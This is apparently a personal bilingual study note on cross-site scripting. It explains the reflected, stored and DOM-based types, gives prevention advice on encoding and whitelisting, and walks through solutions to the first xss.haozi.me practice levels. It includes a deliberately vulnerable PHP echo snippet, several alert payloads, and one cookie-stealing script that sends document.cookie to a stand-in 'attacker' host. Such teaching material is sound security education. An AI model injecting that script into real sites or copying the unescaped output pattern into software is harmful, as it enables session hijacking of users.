  occurs when user input is immediately returned by a web application in an error message/search result or the input provided by the user as part of the request and without permanently storing the user provided data.

- **DOM Based XSS** 

  a form of XSS when the source of the data is in the DOM, the sink is also in the DOM, and the data flow never leaves the browser.



### Reflected CSS

Reflected XSS attacks occur when a web application or API sends user-supplied data back to the browser without proper validation or escaping. This vulnerability is often found in search engines, forms, and other mechanisms that reflect user input as part of their immediate response.

Imagine a search function on a website that directly includes user input in its response. An attacker could craft a URL with a search term that includes a malicious script. When a user clicks on this link, the script executes in their browser. For instance, the URL might be `http://example.com/search?q=<script>alert('XSS')</script>`. If the search term is reflected as-is in the search result page, it would execute the script.



#### **example:**

![Diagram of a persistent XSS attack](https://excess-xss.com/reflected-xss.png)





#### How can reflected XSS succeed?

At first, reflected XSS might seem harmless because it requires the victim himself to actually send a request containing a malicious string. Since nobody would willingly attack himself, there seems to be no way of actually performing the attack.

As it turns out, there are at least two common ways of causing a victim to launch a reflected XSS attack against himself:

- If the user targets a specific individual, the attacker can send the malicious URL to the victim (using e-mail or instant messaging, for example) and trick him into visiting it.
- If the user targets a large group of people, the attacker can publish a link to the malicious URL (on his own website or on a social network, for example) and wait for visitors to click it.

These two methods are similar, and both can be more successful with the use of a URL shortening service, which masks the malicious string from users who might otherwise identify it.



- **服务器端代码**

  ```php
  <?php 
  // Is there any input? 
  if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) { 
      // Feedback for end user 
      echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>'; 
  } 
  ?>
  可以看到，代码直接引用了 name 参数，并没有做任何的过滤和检查，存在明显的 XSS 漏洞。
  ```

  



### Stored XSS

Stored cross-site scripting (also known as second-order or persistent XSS) 

Stored XSS attacks occur when the malicious script is permanently stored on the target system, such as in a database, message board, comment field, or any other location where data is stored. Each time users access this data, the script gets executed in their browser.

Consider a forum where users can post messages. An attacker posts a message containing a script, such as `<script>fetch('/steal-cookie').then(response => document.write(response))</script>`. Every user who views this message will execute the script, potentially leading to cookie theft or other malicious actions.

#### example 

assume that the attacker's ultimate goal is to steal the victim's cookies by exploiting( 利用 ) an XSS vulnerability in the website.

 This can be done by having the victim's browser parse HTML code:

`<script>window.location='http://attacker/?cookie='+document.cookie</script>`

This script navigates the user's browser to a different URL, triggering an HTTP request to the attacker's server. **The URL includes the victim's cookies as a query parameter, which the attacker can extract from the request** .

 Once the attacker has acquired the cookies, he can use them to impersonate( 假冒 ) the victim and launch further attacks.

![Diagram of a persistent XSS attack](https://excess-xss.com/persistent-xss.png)





In terms of exploitability, the key difference between reflected and stored XSS is that a stored XSS vulnerability enables attacks that are self-contained within the application itself. The attacker does not need to find an external way of inducing other users to make a particular request containing their exploit. Rather, the attacker places their exploit into the application itself and simply waits for users to encounter it.

The self-contained nature of stored cross-site scripting exploits is particularly relevant in situations where an XSS vulnerability only affects users who are currently logged in to the application. If the XSS is reflected, then the attack must be fortuitously timed: a user who is induced to make the attacker's request at a time when they are not logged in will not be compromised. In contrast, if the XSS is stored, then the user is guaranteed to be logged in at the time they encounter the exploit



### DOM-based XSS

https://portswigger.net/web-security/cross-site-scripting/dom-based

DOM-based XSS vulnerabilities usually arise when JavaScript takes data from an attacker-controllable source, such as the URL, and passes it to a sink(接收器) that supports dynamic code execution, such as `eval()` or `innerHTML`. 



#### example

the attack payload is executed as a result of modifying the Document Object Model (DOM) of the web page in the client side, often in response to some user action like clicking a link or submitting a form. This type of attack occurs entirely in the browser and does not involve server-side processing of the malicious data.

Consider a web application that uses JavaScript to process and display URL parameters. An attacker could manipulate the URL to include a script, like `http://example.com/page.html#<script>alert('XSS')</script>`. If the JavaScript code naively uses the fragment of the URL to modify the DOM, it could execute the script.

![Diagram of a DOM-based XSS attack](https://excess-xss.com/dom-based-xss.png)

1. The attacker crafts a URL containing a malicious string and sends it to the victim.
2. The victim is tricked by the attacker into requesting the URL from the website.
3. The website receives the request, but does not include the malicious string in the response.
4. The victim's browser executes the legitimate script inside the response, causing the malicious script to be inserted into the page.
5. The victim's browser executes the malicious script inserted into the page, sending the victim's cookies to the attacker's server.



#### What makes DOM-based XSS different

In the previous examples of persistent and reflected XSS attacks, the server inserts the malicious script into the page, which is then sent in a response to the victim. **When the victim's browser receives the response, it assumes the malicious script to be part of the page's legitimate content and automatically executes it during page load **

In the example of a DOM-based XSS attack, however, there is no malicious script inserted as part of the page; the only script that is automatically executed during page load is a legitimate part of the page. The problem is that this legitimate script directly makes use of user input in order to add HTML to the page. Because the malicious string is inserted into the page using `innerHTML`, it is parsed as HTML, causing the malicious script to be executed.



The difference is subtle but important:

- In traditional XSS, the malicious JavaScript is executed when the page is loaded, as part of the HTML sent by the server.
- In DOM-based XSS, the malicious JavaScript is executed at some point after the page has loaded, as a result of the page's legitimate JavaScript treating user input in an unsafe way.



#### Why DOM-based XSS matters

In the previous example, JavaScript was not necessary; the server could have generated all the HTML by itself. If the server-side code were free of vulnerabilities, the website would then be safe from XSS.

However, as web applications become more advanced, an increasing amount of HTML is generated by JavaScript on the client-side rather than by the server. Any time content needs to be changed without refreshing the entire page, the update must be performed using JavaScript. Most notably, this is the case when a page is updated after an AJAX request.

This means that XSS vulnerabilities can be present not only in your website's server-side code, but also in your website's client-side JavaScript code. Consequently, even with completely secure server-side code, the client-side code might still unsafely include user input in a DOM update after the page has loaded. If this happens, the client-side code has enabled an XSS attack through no fault of the server-side code.









## Methods of preventing XSS

Recall that an XSS attack is a type of code injection: user input is mistakenly interpreted as malicious program code. In order to prevent this type of code injection, secure input handling is needed. 

For a web developer, there are two fundamentally different ways of performing secure input handling:

- **Encoding**, which escapes the user input so that the browser interprets it only as data, not as code.
- **Validation**, which filters the user input so that the browser interprets it as code without malicious commands.



### Common features

While these are fundamentally different methods of preventing XSS, they share several common features :

**Context ( where )**

Secure input handling needs to be performed differently depending on where in a page the user input is inserted.

**Inbound/outbound ( when )**

- **inbound** : your website receives the input
- **outbound:** right before your website inserts the input into a page

**Client/server( who )**

Secure input handling can be performed on the client-side or on the server-side



#### Input handling contexts

There are many contexts in a web page where user input might be inserted. For each of these, specific rules must be followed so that the user input cannot break out of its context and be interpreted as malicious code. 

 common contexts:

| Context              | Example code                              |
| :------------------- | :---------------------------------------- |
| HTML element content | `<div>userInput</div>`                    |
| HTML attribute value | `<input value="userInput">`               |
| URL query value      | `http://example.com/?parameter=userInput` |
| CSS value            | `color: userInput`                        |
| JavaScript value     | `var name = "userInput";`                 |



**Why context matters**

In all of the contexts described, an XSS vulnerability would arise if user input were inserted before first being encoded or validated. An attacker would then be able to inject malicious code by simply **inserting the closing delimiter( 分隔符 ) for that context and following it with the malicious code.**



**example:**

Application code : `<input value="userInput">`

Malicious string : `"><script>...</script><input value=""`

Resulting code : `<input value=""><script>...</script><input value="">`

This could be prevented by simply removing all quotation marks in the user input—but only in this context. If the same input were inserted into another context, the closing delimiter would be different and injection would become possible. 

**secure input handling always needs to be tailored to the context where the user input will be inserted.**



#### Inbound/outbound input handling

- **inbound** : your website receives the input
- **outbound:** right before your website inserts the input into a page

Instinctively(本能地）, it might seem that XSS can be prevented by encoding or validating all user input as soon as your website receives it.

This way, any malicious strings should already have been neutralized(失效) whenever they are included in a page, and the scripts generating HTML will not have to concern themselves with secure input handling.

The problem is that, as described previously, user input can be inserted into several contexts in a page. There is no easy way of determining when user input arrives which context it will eventually be inserted into, and the same user input often needs to be inserted into different contexts. Relying on inbound input handling to prevent XSS is thus a very brittle solution that will be prone to errors. (The deprecated "[magic quotes](http://php.net/manual/en/security.magicquotes.php)" feature of PHP is an example of such a solution.)

Instead, outbound input handling should be your primary line of defense against XSS, because it can take into account the specific context that user input will be inserted into. 



#### client and server side

In order to protect against all types of XSS, secure input handling must be performed in both the server-side code and the client-side code.

- In order to protect against traditional XSS, secure input handling must be performed in server-side code. This is done using any language supported by the server.
- In order to protect against DOM-based XSS where the server never receives the malicious string (such as [the fragment identifier attack described earlier](https://excess-xss.com/#dom-based-xss-invisible-to-server)), secure input handling must be performed in client-side code. This is done using JavaScript.



### Encoding

Encoding is the act of escaping user input so that the browser interprets it only as data, not as code. 

The most recognizable encoding in web development is **HTML escaping**, which converts characters `<`  into `&lt;`(less than ),  `>` into `&gt;` (greater than)

**example :**

```
print "<html>"
print "Latest comment: "
print encodeHtml(userInput)
print "</html>"
```

If the user input were the string `<script>...</script>`, the resulting HTML would be as follows:

```
<html>
Latest comment:
&lt;script&gt;...&lt;/script&gt
</html>
```

Because all characters with special meaning have been escaped, the browser will not parse any part of the user input as HTML.



#### Encoding on the client-side

When encoding user input on the client-side using JavaScript, there are several built-in methods and properties that automatically encode all data in a context-aware manner:

| Context              | Method/property                                              |
| :------------------- | :----------------------------------------------------------- |
| HTML element content | `node.textContent = userInput`                               |
| HTML attribute value | `element.setAttribute(attribute, userInput)` or `element[attribute] = userInput` |
| URL query value      | `window.encodeURIComponent(userInput)`                       |
| CSS value            | `element.style.property = userInput`                         |



#### Limitations of encoding

Even with encoding, it will be possible to input malicious strings into some contexts. A notable example of this is when user input is used to provide URLs, such as in the example below:

```
document.querySelector('a').href = userInput
```

Although assigning a value to the `href` property of an anchor element automatically encodes it so that it becomes nothing more than an attribute value, this in itself does not prevent the attacker from inserting a URL beginning with "`javascript:`". When the link is clicked, whatever JavaScript is embedded inside the URL will be executed.

Encoding is also an inadequate solution when you actually want the user to define part of a page's code. An example is a user profile page where the user can define custom HTML. If this custom HTML were encoded, the profile page could consist only of plain text.

In situations like these, encoding has to be complemented with validation





### Validation 认证

Validation is the act of filtering user input so that all malicious parts of it are removed, without necessarily removing all code in it. One of the most recognizable types of validation in web development is allowing some HTML elements (such as `<em>` and `<strong>`) but disallowing others (such as `<script>`).

There are two main characteristics of validation that differ between implementations:

- **Classification strategy**

  User input can be classified using either blacklisting or whitelisting.

- **Validation outcome**

  User input identified as malicious can either be rejected or sanitised.



#### Classification strategy



##### Blacklisting

Instinctively, it seems reasonable to perform validation by defining a forbidden pattern that should not appear in user input. If a string matches this pattern, it is then marked as invalid. An example would be to allow users to submit custom URLs with any protocol except `javascript:`. This classification strategy is called *blacklisting*.

**blacklisting has two major drawbacks:**

 Accurately describing the set of all possible malicious strings is usually a very complex task.

The example policy( 策略 ) described above could not be successfully implemented by simply searching for the substring "`javascript`", because this would miss strings of the form "`Javascript:`" (where the first letter is capitalized) and "`javascript:`" (where the first letter is encoded as a numeric character reference).



**Staleness 陈旧**

Even if a perfect blacklist were developed, it would fail if a new feature allowing malicious use were added to the browser. For example, an HTML validation blacklist developed before the introduction of the HTML5 `onmousewheel` attribute would fail to stop an attacker from using that attribute to perform an XSS attack. This drawback is especially significant in web development, which is made up of many different technologies that are constantly being updated.

**Because of these drawbacks, blacklisting as a classification strategy is strongly discouraged. Whitelisting is usually a much safer approach**



##### Whitelisting

instead of defining a forbidden pattern, a whitelist approach defines an allowed pattern and marks input as invalid if it *does not* match this pattern.

In contrast with the blacklisting example before, an example of whitelisting would be to allow users to submit custom URLs containing only the protocols `http:` and `https:`, nothing else. This approach would automatically mark a URL as invalid if it had the protocol `javascript:`, even if it appeared as "`Javascript:`" or "`javascript:`".

Compared to blacklisting, there are **two major benefits of whitelisting:**

- **Simplicity**

  Accurately describing a set of safe strings is generally much easier than identifying the set of all malicious strings. This is especially true in common situations where user input only needs to include a very limited subset of the functionality available in a browser. 

  **Longevity**

  Unlike a blacklist, a whitelist will generally not become obsolete when a new feature is added to the browser. For example, an HTML validation whitelist allowing only the `title` attribute on HTML elements would remain safe even if it was developed before the introduction of HTML5 `onmousewheel` attribute.







## Practises

https://xss.haozi.me/



### 00

![image-20240505194515271](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505194515271.png)

payload : `<script>alert(1)</script>`



### 01



#### `<textarea>`

https://developer.mozilla.org/en-US/docs/Web/HTML/Element/textarea

a multi-line plain-text editing control, useful when you want to allow users to enter a sizeable amount of free-form text, for example a comment on a review or feedback form.

**example :** 

```html
<label for="story">Tell us your story:</label>
<textarea id="story" name="story" rows="5" cols="33">
    It was a dark and stormy night...
</textarea>
```

<label for="story">Tell us your story:</label>

<textarea id="story" name="story" rows="5" cols="33">
    It was a dark and stormy night...
</textarea>

features :

- An `id` attribute to allow the `<textarea>` to be associated with a `<label>` element for accessibility purposes
- A `name` attribute to set the name of the associated data point submitted to the server when the form is submitted.

- `rows` and `cols` attributes to allow you to specify an exact size for the `<textarea>` to take. Setting these is a good idea for consistency, as browser defaults can differ.

- Default content entered between the opening and closing tags. `<textarea>` does not support the `value` attribute.



#### Solve

![image-20240505195702184](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505195702184.png)

payload = `</textarea><script>alert(1)</script>`

首先需要闭合 `<textarea>` 标签



### 02

![image-20240505200032916](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505200032916.png)

payload = `"><script>alert(1)</script>`

首先需要闭合value 遗留的 "  , 然后再闭合input 标签的 > ,



### 03

正则 `/[()]/g` 意义 ：

- `/`：正则表达式的开始和结束分隔符。在 JavaScript 和许多其他语言中，正则表达式通常使用 `/` 包裹
- `[()]`：方括号内的字符集，表示匹配其中的任意一个字符。即匹配 `(` 或 `)`
- `g`：全局标志，表示匹配应该应用于整个字符串，而不是仅仅匹配第一个出现的实例。

![image-20240505220339316](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505220339316.png)
